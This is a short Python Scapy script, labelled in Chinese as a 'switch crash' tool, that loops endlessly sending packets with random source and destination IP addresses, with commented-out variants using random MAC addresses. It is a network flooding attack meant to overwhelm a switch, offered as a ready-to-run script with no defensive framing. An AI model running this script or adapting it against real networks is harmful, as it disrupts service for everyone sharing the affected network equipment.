import time
from scapy.all import *
from sys import argv
from random import randint
"""交换机崩溃"""


while 1:
    ##二层+三层
    #padket=Ether(src=RandMac(),dst=RandMac())/IP(src=RandIP(),dst=RandIP())/ICMP()
    ##二层
    #padket = Ether(src=RandMac(), dst=RandMac())
    ##三层
    packet = IP(src=RandIP(),dst=RandIP())/ICMP()

    time.sleep(0.5)
    sendp(packet)
    print(packet.summary())